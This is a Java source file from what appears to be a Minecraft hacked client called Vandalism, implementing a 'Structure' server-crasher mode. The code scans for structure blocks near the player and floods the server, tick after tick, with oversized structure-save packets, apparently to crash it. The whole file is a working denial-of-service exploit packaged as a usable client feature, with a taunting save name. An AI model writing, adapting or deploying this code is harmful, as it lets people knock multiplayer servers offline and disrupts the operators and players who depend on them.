package de.nekosarekawaii.vandalism.feature.module.impl.exploit.modes.servercrasher;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.event.game.TickGameListener;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import net.minecraft.block.StructureBlock;
import net.minecraft.block.entity.StructureBlockBlockEntity;
import net.minecraft.block.enums.StructureBlockMode;
import net.minecraft.network.packet.c2s.play.UpdateStructureBlockC2SPacket;
import net.minecraft.util.BlockMirror;
import net.minecraft.util.BlockRotation;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3i;

import java.util.ArrayList;
import java.util.List;

public class StructureModuleMode extends ModuleMulti<ServerCrasherModule> implements TickGameListener {

    private final List<BlockPos> structureBlocks = new ArrayList<>();
    private int current = 0;

    public StructureModuleMode(final ServerCrasherModule parent) {
        super("Structure", parent);
    }

    private void reset() {
        this.current = 0;
        this.structureBlocks.clear();
    }

    @Override
    public void onActivate() {
        this.reset();
        Vandalism.getInstance().getEventSystem().subscribe(TickGameEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(TickGameEvent.ID, this);
        this.reset();
    }

    @Override
    public void onTick() {
        if (this.mc.player == null) return;
        final int range = 40;
        if (this.structureBlocks.isEmpty()) {
            for (int x = -range; x < range; x++) {
                for (int y = -range; y < range; y++) {
                    for (int z = -range; z < range; z++) {
                        final BlockPos blockPos = new BlockPos(
                                (int) (this.mc.player.getX() + x),
                                (int) (this.mc.player.getY() + y),
                                (int) (this.mc.player.getZ() + z)
                        );
                        if (this.mc.world.getBlockState(blockPos).getBlock() instanceof StructureBlock) {
                            this.structureBlocks.add(blockPos);
                        }
                    }
                }
            }
            this.current = 0;
            return;
        }
        final BlockPos randomStructureBlock = this.structureBlocks.get(this.current);
        if (this.current < this.structureBlocks.size() - 1) this.current++;
        else this.current = 0;
        final int size = 100;
        this.mc.getNetworkHandler().sendPacket(new UpdateStructureBlockC2SPacket(
                randomStructureBlock,
                StructureBlockBlockEntity.Action.SAVE_AREA,
                StructureBlockMode.SAVE,
                "fucked_by_nekosarekawaii",
                new BlockPos(0, 1, 0),
                new Vec3i(size, size, size),
                BlockMirror.NONE,
                BlockRotation.NONE,
                "",
                true,
                true,
                true,
                1.0f,
                0
        ));
    }

}
